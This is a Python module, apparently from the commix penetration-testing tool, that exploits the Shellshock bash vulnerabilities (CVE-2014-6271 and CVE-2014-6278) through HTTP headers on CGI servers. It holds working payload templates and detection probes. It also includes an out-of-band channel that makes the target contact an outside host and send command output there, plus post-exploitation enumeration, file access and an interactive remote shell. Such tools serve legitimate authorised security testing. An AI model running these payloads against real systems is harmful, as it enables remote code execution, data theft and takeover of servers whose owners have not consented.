#!/usr/bin/env python

import re
import time
import string
import random
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.six.moves import http_client as _http_client
from src.core.parse import cmdline as menu
from src.utils import logs
from src.utils import settings
from src.utils import session_handler
from src.core.requests import requests
from src.core.requests import headers as log_http_headers
from src.core.controller import checks
from src.core.controller import handler
from src.core.controller import controller

default_user_agent = menu.options.agent
default_cookie = ""

if menu.options.cookie:
  if settings.INJECT_TAG in menu.options.cookie:
    menu.options.cookie = menu.options.cookie.replace(settings.INJECT_TAG , "")
  default_cookie = menu.options.cookie

"""
This module exploits the vulnerabilities CVE-2014-6271 [1], CVE-2014-6278 [2] in Apache CGI.
[1] CVE-2014-6271: https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271
[2] CVE-2014-6278: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
"""

if settings.MULTI_TARGETS or settings.STDIN_PARSING:
  controller.init_http_header_injection_status()
  controller.init_cookie_injection_status()

# Available Shellshock CVEs
shellshock_cves = [
"CVE-2014-6271",
"CVE-2014-6278"
]

"""
A -p naming a cookie's own key isn't shellshock's concern - only one naming the header itself restricts it.
"""
def _header_testable(check_header):
  name = check_header.lower()
  header_names = [h.lower() for h in settings.SHELLSHOCK_HTTP_HEADERS]
  if settings.TESTABLE_PARAMETERS_LIST:
    if any(p in header_names for p in settings.TESTABLE_PARAMETERS_LIST):
      return name in settings.TESTABLE_PARAMETERS_LIST
    return True
  if settings.SKIP_PARAMETERS_LIST:
    return name not in settings.SKIP_PARAMETERS_LIST
  return True

"""
Available shellshock payloads
"""
def shellshock_payloads(cve, attack_vector):
  if cve == shellshock_cves[0] :
    payload = "() { :; }; " + attack_vector
  elif cve == shellshock_cves[1] :
    payload = "() { _; } >_[$($())] { " + attack_vector + " } "
  else:
    pass
  return payload

"""
Shellshock bug exploitation
"""
def shellshock_exploitation(cve, cmd):
  attack_vector = " echo; " + cmd + ";"
  payload = shellshock_payloads(cve, attack_vector)
  return payload

"""
Send a request with the given header set to payload, restoring the CLI-provided value afterward.
"""
def _send_header_payload(url, check_header, payload):
  header = {check_header: payload}
  request = _urllib.request.Request(url, None, header)
  if check_header == settings.COOKIE:
    menu.options.cookie = payload
  if check_header == settings.USER_AGENT:
    menu.options.agent = payload
  response = log_http_headers.send_request(request)
  if check_header == settings.COOKIE:
    menu.options.cookie = default_cookie
  if check_header == settings.USER_AGENT:
    menu.options.agent = default_user_agent
  return response

"""
Probe every header and CVE through the out-of-band channel, then wait once for the whole sweep.
"""
def _oob_probe(url, testable_headers):
  from src.core.techniques.oob import oob_payloads as oob_payloads

  channel = checks.init_oob_channel()
  if channel is None:
    return None, None
  for transport in oob_payloads.transports():
    fired = []
    sent = {}
    for check_header in testable_headers:
      for cve in shellshock_cves:
        token, hostname = channel.new_payload()
        # A header is not URL-decoded, so the sum goes in with a literal plus. The attack vector is
        # a bash one, which needs nothing run ahead of the command for the sum to hold a value.
        expression, expected, _ = oob_payloads.proof(transport, plus="+")
        attack_vector = settings.SINGLE_WHITESPACE + "echo; " + oob_payloads.reach_command(transport, hostname, expression) + ";"
        payload = shellshock_payloads(cve, attack_vector)
        if settings.VERBOSITY_LEVEL != 0:
          settings.print_data_to_stdout(settings.print_payload(payload))
        _send_header_payload(url, check_header, payload)
        sent[token] = payload
        fired.append((token, check_header, cve, expected))

    deadline = time.time() + settings.OOB_TIMEOUT
    while time.time() < deadline:
      for token, check_header, cve, expected in fired:
        if checks.oob_proof_holds(channel.seen(token, protocol=oob_payloads.required_protocol(transport)), expected):
          settings.OOB_TRANSPORT = transport
          settings.SHELLSHOCK_OOB = True
          return check_header, cve, sent[token]
      time.sleep(1)
  return None, None, ""

"""
Run a command through the out-of-band channel and read its output back.
"""
def _oob_cmd_exec(url, cmd, cve, check_header):
  from src.core.techniques.oob import oob_payloads as oob_payloads

  channel = settings.OOB_CHANNEL
  if channel is None:
    return ""
  token, hostname = channel.new_payload()
  # A header is not URL-decoded, so the pipe goes in literally.
  command = oob_payloads.exfil_command(settings.OOB_TRANSPORT, hostname, cmd, pipe="|")
  if not command:
    return ""
  attack_vector = settings.SINGLE_WHITESPACE + "echo; " + command + ";"
  payload = shellshock_payloads(cve, attack_vector)
  if settings.VERBOSITY_LEVEL != 0:
    settings.print_data_to_stdout(settings.print_payload(payload))
  _send_header_payload(url, check_header, payload)
  for interaction in channel.wait_for(token, settings.OOB_TIMEOUT, protocol="http"):
    body = checks.oob_request_body(interaction.raw_request)
    if body:
      return body.rstrip("\r\n")
  return ""

"""
Build the shared execute_cmd(cmd) -> output callback, logging execution only when asked to.
"""
def _command_executor(url, cve, check_header, filename, log_execution=False):
  # Run one command through the shellshock injection point.
  def execute_cmd(cmd):
    shell = cmd_exec(url, cmd, cve, check_header, filename)
    if log_execution and shell:
      logs.executed_command(filename, cmd, shell)
    return shell
  return execute_cmd

"""
Enumeration Options
"""
def enumeration(url, cve, check_header, filename):
  checks.run_enumeration(_command_executor(url, cve, check_header, filename), filename, url)

"""
File Access Options
"""
def file_access(url, cve, check_header, filename):
  checks.run_file_access(_command_executor(url, cve, check_header, filename), filename)

"""
Enumeration, file access, --os-cmd, --os-shell - shared by fresh detection and resume.
"""
def _post_exploitation(url, cve, check_header, filename, technique, no_result):
  if settings.ENUMERATION_DONE:
    checks.ask_redo_stored_session("enumerate", lambda: enumeration(url, cve, check_header, filename))
  else:
    enumeration(url, cve, check_header, filename)

  if settings.FILE_ACCESS_DONE == True:
    checks.ask_redo_stored_session("access files", lambda: file_access(url, cve, check_header, filename))
  else:
    file_access(url, cve, check_header, filename)

  if menu.options.os_cmd:
    checks.run_single_os_cmd(_command_executor(url, cve, check_header, filename), filename)

  # Opens later, at quit(), same as the main flow.
  execute_cmd = _command_executor(url, cve, check_header, filename, log_execution=True)
  handler.pseudo_terminal_shell_generic(url, filename, technique, no_result, execute_cmd, on_found_declined=lambda: None)

"""
The main shellshock handler
"""
def shellshock_handler(url, http_request_method, filename):

  counter = 1
  no_result = True

  injection_type = "results-based command injection"
  # Not an injection technique like the others - it's the '--shellshock' module.
  technique = "shellshock module"

  try:
    # Resume everything at once and quit, like the core engine's LOAD_SESSION path.
    stored = [row for row in session_handler.get_all_stored_shellshock(url, http_request_method) if _header_testable(row[0])]
    if stored:
      rows = [(technique, injection_type, check_header, stored_payload, "HTTP Header") for check_header, stored_payload in stored]
      checks.resumed_injection_points_summary(rows)

      # Still applies on resume, same as fresh detection.
      first_header, _ = stored[0]
      _post_exploitation(url, shellshock_cves[0], first_header, filename, technique, no_result=False)

      checks.suggest_os_shell()
      settings.INJECTION_CHECKER = True
      settings.SHOW_LOGS_MSG = True
      checks.quit(filename, url, hard_exit=False)

    i = 0
    asked_keep_testing = False
    total = len(shellshock_cves) * len(settings.SHELLSHOCK_HTTP_HEADERS)
    for check_header in settings.SHELLSHOCK_HTTP_HEADERS:
      if not _header_testable(check_header):
        continue

      found_this_header = False
      # The one that answered, kept as the loop moves on: what follows has to be sent the same way
      # the finding was made, and the loop variable holds whichever was tried last.
      working_cve = None

      for cve in shellshock_cves:
        # Check injection state
        settings.DETECTION_PHASE = True
        settings.EXPLOITATION_PHASE = False
        i = i + 1
        attack_vector = "echo" + settings.SINGLE_WHITESPACE + cve + ":Done;"
        payload = shellshock_payloads(cve, attack_vector)

        # Check if defined "--verbose" option.
        if settings.VERBOSITY_LEVEL != 0:
          settings.print_data_to_stdout(settings.print_payload(payload))
        response = _send_header_payload(url, check_header, payload)

        if type(response) is bool:
          response_info = ""
        else:
          response_info = response.info()

        # The CVE's own marker, injected into the payload, lands back as a raw response header.
        found = len(response_info) > 0 and cve in response_info
        if found:
          no_result = False
        done = found or (no_result and i >= total)
        checks.injection_process(injection_type, technique, done=done, i=i, total=total)

        if found and not found_this_header:
          found_this_header = True
          working_cve = cve
          # Check injection state
          settings.DETECTION_PHASE = False
          settings.EXPLOITATION_PHASE = True
          vuln_parameter = check_header
          the_type = settings.SINGLE_WHITESPACE + "HTTP Header"
          header_name = settings.SINGLE_WHITESPACE + check_header
          settings.CHECKING_PARAMETER = check_header + settings.SINGLE_WHITESPACE + "HTTP Header"
          checks.announce_vulnerable_finding(filename, injection_type, technique, the_type, header_name, http_request_method, vuln_parameter, payload, counter, decode_payload=False)

          # Persist for future resume.
          settings.HTTP_HEADER = check_header
          session_handler.import_injection_points(url, technique, injection_type, filename, "", True, vuln_parameter, "", "", "", False, payload, http_request_method, 0, 0, 0, 0, settings.INJECTION_LEVEL)

      if found_this_header:
        _post_exploitation(url, working_cve, check_header, filename, technique, no_result)

        # Asked once for the whole run, not once per header.
        if not asked_keep_testing:
          asked_keep_testing = True
          if checks.prompt_keep_testing(url):
            break

    # Nothing echoed back, so try the out-of-band channel - a blind sink reflects no marker.
    if no_result and menu.options.oob:
      testable = [_ for _ in settings.SHELLSHOCK_HTTP_HEADERS if _header_testable(_)]
      check_header, cve, payload = _oob_probe(url, testable)
      if check_header:
        no_result = False
        settings.DETECTION_PHASE = False
        settings.EXPLOITATION_PHASE = True
        vuln_parameter = check_header
        settings.CHECKING_PARAMETER = check_header + settings.SINGLE_WHITESPACE + "HTTP Header"
        settings.HTTP_HEADER = check_header
        checks.announce_vulnerable_finding(filename, settings.INJECTION_TYPE.BLIND, technique, settings.SINGLE_WHITESPACE + "HTTP Header", settings.SINGLE_WHITESPACE + check_header, http_request_method, vuln_parameter, payload, counter, decode_payload=False)
        session_handler.import_injection_points(url, technique, settings.INJECTION_TYPE.BLIND, filename, "", True, vuln_parameter, "", "", "", False, payload, http_request_method, 0, 0, 0, 0, settings.INJECTION_LEVEL)
        _post_exploitation(url, cve, check_header, filename, technique, no_result)

    if settings.CONFIRMED_INJECTION_POINTS:
      checks.quit(filename, url, hard_exit=False)
    elif no_result == True:
      if settings.VERBOSITY_LEVEL == 0:
        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
      err_msg = "All tested HTTP headers appear to be not injectable."
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      raise SystemExit()
            
  except _urllib.error.HTTPError as err_msg:
    # 500/400 during header/CVE probing just means this combination failed - not fatal.
    if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR or str(err_msg.code) == settings.BAD_REQUEST:
      response = False
    else:
      requests.request_failed(err_msg)

  except (_urllib.error.URLError, _http_client.IncompleteRead) as err_msg:
    requests.request_failed(err_msg)

"""
Per-binary cache of the path prefix that resolved it last time, so a repeated command skips straight to its known-working prefix instead of re-probing the bare/'/bin/'/'/usr/bin/' cascade.
"""
RESOLVED_CMD_PREFIX = {}

"""
Execute user commands
"""
def cmd_exec(url, cmd, cve, check_header, filename):

  if settings.SHELLSHOCK_OOB:
    return _oob_cmd_exec(url, cmd, cve, check_header)

  """
  Check for shellshock 'shell'
  """
  def check_for_shell(url, cmd, cve, check_header, filename):
    try:
      TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
      cmd = "echo " + TAG + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + TAG
      payload = shellshock_exploitation(cve, cmd)
      debug_msg = "Executing the '" + cmd + "' command. "
      if settings.VERBOSITY_LEVEL != 0:
        settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
        settings.print_data_to_stdout(settings.print_payload(payload))

      response = _send_header_payload(url, check_header, payload)
      shell = checks.process_page_content(response, action="decode").rstrip().replace(settings.END_LINE.LF,' ')
      shell = re.findall(r"" + TAG + "(.*)" + TAG, shell)
      return ''.join(shell)

    except _urllib.error.URLError as err_msg:
      requests.request_failed(err_msg)

  cmd_name = cmd.split(settings.SINGLE_WHITESPACE)[0]
  prefixes = ["", "/bin/", "/usr/bin/"]
  cached_prefix = RESOLVED_CMD_PREFIX.get(cmd_name)
  if cached_prefix in prefixes:
    prefixes.remove(cached_prefix)
    prefixes.insert(0, cached_prefix)

  for prefix in prefixes:
    shell = check_for_shell(url, prefix + cmd, cve, check_header, filename)
    if shell:
      RESOLVED_CMD_PREFIX[cmd_name] = prefix
      return shell

  return shell

# eof
